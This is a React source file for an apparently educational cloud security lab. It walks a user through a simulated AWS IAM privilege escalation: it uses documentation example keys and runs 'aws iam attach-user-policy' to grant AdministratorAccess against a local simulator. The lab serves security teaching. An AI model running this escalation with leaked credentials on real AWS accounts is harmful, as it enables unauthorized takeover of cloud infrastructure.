import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { CyberCard } from "@/components/cyber/CyberCard";
import { LabFrame } from "@/components/labs/LabFrame";
import { CyberButton } from "@/components/cyber/CyberButton";
import { Cloud, Key, Terminal, ShieldAlert, CheckCircle2 } from "lucide-react";

export const Route = createFileRoute("/labs/iam-privesc")({
  head: () => ({
    meta: [
      { title: "IAM Privilege Escalation Lab — Straxon Secure" },
      {
        name: "description",
        content: "Exploit an AWS IAM misconfiguration to gain AdministratorAccess.",
      },
    ],
  }),
  component: IAMPrivEscLab,
});

function IAMPrivEscLab() {
  const [step, setStep] = useState<"enum" | "escalate" | "pwned">("enum");
  const [commandsRun, setCommandsRun] = useState<{ cmd: string; output: string }[]>([]);
  const [loading, setLoading] = useState(false);

  const runCmd = async (cmd: string, nextStep: "enum" | "escalate" | "pwned" | null = null) => {
    setLoading(true);
    try {
      const mlUrl = import.meta.env.VITE_ML_ENGINE_URL || "http://localhost:8082";
      const res = await fetch(`${mlUrl}/api/ml/aws-sim`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: cmd }),
      });
      const data = await res.json();
      setCommandsRun((prev) => [...prev, { cmd, output: data.result || "Error" }]);
    } catch (e) {
      console.error(e);
      setCommandsRun((prev) => [...prev, { cmd, output: "Error connecting to simulator." }]);
    }
    if (nextStep) setStep(nextStep);
    setLoading(false);
  };

  return (
    <LabFrame title="CLOUD IAM PRIVILEGE ESCALATION" badge="LAB-IAM" recorderLab="iam-privesc">
      <p className="text-slate-400 max-w-3xl mb-6 font-mono text-sm leading-relaxed">
        You've compromised a developer's AWS Access Key via a public GitHub repository. It seems
        restricted to read-only access, but a misconfigured{" "}
        <code className="text-[#00f3ff]">iam:AttachUserPolicy</code> permission might allow you to
        grant yourself Administrator access.
      </p>

      <div className="grid lg:grid-cols-2 gap-6">
        <div className="space-y-6">
          <CyberCard variant="cyan" className="p-5">
            <h3 className="font-mono text-xs uppercase text-[#00f3ff] mb-4 flex items-center gap-2">
              <Key className="h-4 w-4" /> Compromised Credentials
            </h3>
            <div className="bg-[#020610] p-3 rounded border border-[#00f3ff]/20 font-mono text-xs text-slate-300 space-y-2">
              <div>
                <span className="text-slate-500">AWS_ACCESS_KEY_ID=</span>AKIAIOSFODNN7EXAMPLE
              </div>
              <div>
                <span className="text-slate-500">AWS_SECRET_ACCESS_KEY=</span>
                wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
              </div>
            </div>
          </CyberCard>

          <CyberCard variant="plain" className="p-5">
            <h3 className="font-mono text-xs uppercase text-slate-400 mb-4 flex items-center gap-2">
              <Terminal className="h-4 w-4" /> Attack Terminal
            </h3>

            <div className="space-y-3 min-h-[120px]">
              {step === "enum" && (
                <>
                  <p className="text-xs font-mono text-slate-400 mb-2">
                    1. Enumerate your current permissions to see who you are.
                  </p>
                  <CyberButton
                    variant="cyan"
                    className="w-full text-left justify-start font-mono text-xs px-3"
                    onClick={() => runCmd("aws sts get-caller-identity", "escalate")}
                    disabled={loading}
                  >
                    $ aws sts get-caller-identity
                  </CyberButton>
                </>
              )}

              {step === "escalate" && (
                <>
                  <p className="text-xs font-mono text-slate-400 mb-2">
                    2. You are <code className="text-[#00f3ff]">dev-user-01</code>. You notice you
                    have the <code className="text-[#ff003c]">iam:AttachUserPolicy</code> permission
                    on yourself! Exploit this to attach the Admin policy.
                  </p>
                  <CyberButton
                    variant="magenta"
                    className="w-full text-left justify-start font-mono text-xs px-3"
                    onClick={() =>
                      runCmd(
                        "aws iam attach-user-policy --user-name dev-user-01 --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
                        "pwned",
                      )
                    }
                    disabled={loading}
                  >
                    $ aws iam attach-user-policy --user-name dev-user-01 ...
                  </CyberButton>
                </>
              )}

              {step === "pwned" && (
                <div className="bg-emerald-500/10 border border-emerald-500/30 p-6 rounded text-center">
                  <CheckCircle2 className="h-10 w-10 text-emerald-400 mx-auto mb-3" />
                  <div className="font-mono font-bold text-emerald-400 text-lg">
                    SYSTEM COMPROMISED
                  </div>
                  <div className="text-xs font-mono text-slate-400 mt-2">
                    You now have full AWS Administrator access.
                  </div>
                </div>
              )}
            </div>
          </CyberCard>
        </div>

        <div className="bg-[#050B14] rounded-xl border border-white/10 p-5 font-mono text-[11px] overflow-y-auto h-[400px]">
          <div className="text-slate-600 mb-6">// AWS CLI Output Terminal</div>
          {commandsRun.map((entry, i) => (
            <div key={i} className="mb-6">
              <div className="text-white mb-2">$ {entry.cmd}</div>
              {entry.cmd.includes("get-caller-identity") || entry.cmd.includes("get-user") ? (
                <pre className="text-[#00f3ff] leading-relaxed">{entry.output}</pre>
              ) : (
                <div className="text-yellow-400 bg-yellow-500/10 p-2 rounded whitespace-pre-wrap">
                  {entry.output}
                </div>
              )}
            </div>
          ))}
          {loading && <div className="text-slate-500 animate-pulse">$ executing...</div>}
        </div>
      </div>
    </LabFrame>
  );
}
